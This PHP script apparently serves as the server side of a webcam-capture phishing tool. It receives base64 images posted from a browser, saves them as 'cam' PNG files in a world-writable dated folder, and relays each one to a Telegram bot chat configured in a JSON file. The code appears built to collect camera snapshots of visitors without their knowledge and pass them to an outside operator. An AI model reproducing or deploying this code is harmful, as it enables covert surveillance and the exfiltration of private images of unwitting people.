<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");
}

// Create folder name with current date only
$folderName = date('Y-m-d');

// Create folder if it doesn't exist
if (!file_exists($folderName)) {
    mkdir($folderName, 0777, true);
}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$filePath = $folderName . '/cam' . $date . '.png';
$fp = fopen($filePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

// Send to Telegram - load from config file
$telegram_token = '';
$telegram_chat = '';
$config_file = 'telegram_config.json';

if (file_exists($config_file)) {
    $config_content = file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
        $telegram_token = $config['bot_token'];
        $telegram_chat = $config['chat_id'];
    }
}

// Only send if Telegram is configured
if (!empty($telegram_token) && !empty($telegram_chat)) {
    // Send photo to Telegram using cURL if available, otherwise use file_get_contents
    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendPhoto";
    $caption = "📸 *Camera Capture*\n\n⏰ *Time:* " . date('Y-m-d H:i:s');

    if (function_exists('curl_file_create')) {
        // Use cURL (preferred method)
        $cfile = curl_file_create($filePath, 'image/png', 'cam' . $date . '.png');
        $data = array(
            'chat_id' => $telegram_chat,
            'photo' => $cfile,
            'caption' => $caption,
            'parse_mode' => 'Markdown'
        );
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            error_log("Telegram cURL error: " . $error, 3, "telegram_error.log");
        }
    } else {
        // Fallback to file_get_contents with multipart
        $boundary = uniqid();
        $delimiter = '-------------' . $boundary;
        
        $postData = '';
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
        $postData .= $telegram_chat . "\r\n";
        
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="photo"; filename="cam' . $date . '.png"' . "\r\n";
        $postData .= 'Content-Type: image/png' . "\r\n\r\n";
        $postData .= $unencodedData . "\r\n";
        
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
        $postData .= $caption . "\r\n";
        $postData .= "--" . $delimiter . "--\r\n";
        
        $options = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
                'content' => $postData,
                'timeout' => 10,
                'ignore_errors' => true
            )
        );
        
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        
        if ($result === false) {
            $error = error_get_last();
            if ($error !== null) {
                error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
            }
        }
    }
}

exit();
?>
